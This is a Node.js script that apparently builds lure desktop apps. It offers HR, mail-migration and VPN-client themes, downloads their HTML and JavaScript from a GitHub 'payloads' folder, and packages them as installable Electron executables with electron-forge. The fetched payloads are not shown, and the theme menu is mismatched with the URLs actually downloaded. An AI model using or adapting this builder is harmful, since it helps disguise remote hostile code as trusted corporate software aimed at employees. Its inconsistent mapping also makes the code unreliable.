const fs = require('fs');
const https = require('https');
const { execSync } = require('child_process');
const prompt = require('prompt-sync')();

async function main() {
    const installFolderInput = prompt('What is the folder name?\n').trim();
    fs.mkdirSync(installFolderInput, { recursive: true });
    process.chdir(installFolderInput);
    console.log(`Folder created. Trying to install into: ${process.cwd()}\n`);

    try {
        execSync('npm init -y', { stdio: 'inherit' });
        console.log('npm init completed successfully.\n');
        const choice = prompt('Which theme? 1) HR 2) Mail Migration 3) VPN Client').trim();
        await handleChoice(choice);
    } catch (error) {
        console.error('Error:', error);
    }
}

async function downloadFile(url, filename) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(filename);
        https.get(url, (response) => {
            response.pipe(file);
            file.on('finish', () => {
                file.close(resolve);
                console.log(`${filename} downloaded.`);
            });
        }).on('error', (error) => {
            fs.unlink(filename, () => {
                reject(error);
            });
        });
    });
}

async function handleChoice(choice) {
    if (choice === '1' || choice === '2' || choice === '3') {
        await downloadThemes(choice);
        console.log('Theme downloaded. Continuing to the next step\n');
        updatePackageJson();
    } else {
        console.log('Invalid choice. Please enter a valid option.');
        await main();
    }
}

async function downloadThemes(choice) {
    console.log("Make a choice from these options");

    const filesForChoice = [
        'index.html',
        'styles.css',
        'index.js',
        'app.ico',
        'loading.gif'
    ];

    const filesForChoice2And3 = [
        'index.html',
        'styles.css',
        'index.js',
        'app.ico',
        'loading.gif'
    ];

    const baseURLChoice2 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/';
    const baseURLChoice3 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/some_other_folder/';

    if (choice === '1') {
        await Promise.all(filesForChoice.map(file =>
            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/${file}`, file)
        ));
    } else if (choice === '2') {
        await Promise.all(filesForChoice.map(file =>
            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/${file}`, file)
        ));
    } else if (choice === '3') {
        await Promise.all(filesForChoice.map(file =>
            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/hrportal/${file}`, file)
        ));
    } else {
        console.log("Invalid choice. Please choose again.");
        // Here, you might want to add a prompt or input method for the user to choose again
    }
}

function updatePackageJson() {
    try {
        let packageJson = {};

        if (fs.existsSync('package.json')) {
            const content = fs.readFileSync('package.json', 'utf8').trim();
            packageJson = content ? JSON.parse(content) : {};
        }

        packageJson.name = "your-app-name";
        packageJson.version = "1.0.0";
        packageJson.main = "index.js";
        packageJson.scripts = {
            "start": "electron .",
            "test": "echo \"Error: no test specified\" && exit 1",
            "package": "electron-forge package",
            "make": "electron-forge make"
        };

        // Update or add author and description fields
        packageJson.author = "Real Author";
        packageJson.description = "The app description";

        packageJson.license = "MIT";
        packageJson.devDependencies = {
            "@electron-forge/cli": "^7.0.0",
            "@electron-forge/maker-deb": "^7.0.0",
            "@electron-forge/maker-rpm": "^7.0.0",
            "@electron-forge/maker-squirrel": "^7.0.0",
            "@electron-forge/maker-zip": "^7.0.0",
            "@electron-forge/plugin-auto-unpack-natives": "^7.0.0",
            "electron": "^27.1.0"
        };
        packageJson.dependencies = {
            "electron-squirrel-startup": "^1.0.0"
        };

        fs.writeFileSync('package.json', JSON.stringify(packageJson, null, 2));
        console.log('package.json updated successfully.\n');
        console.log('Attempting Electron install..\n');
        installElectron();
    } catch (error) {
        console.error('Error reading/writing package.json:', error);
    }
}

function installElectron() {
    try {
        execSync('npm install electron --save-dev', { stdio: 'inherit' });
        //execSync('npm run start', { stdio: 'inherit' });
	execSync('npm install --save-dev @electron-forge/cli', { stdio: 'inherit' });
	execSync('npx electron-forge import', { stdio: 'inherit' });
execSync('npm run make', { stdio: 'inherit' });
    } catch (error) {
        console.error('Error installing/running Electron:', error);
    }
}

main();
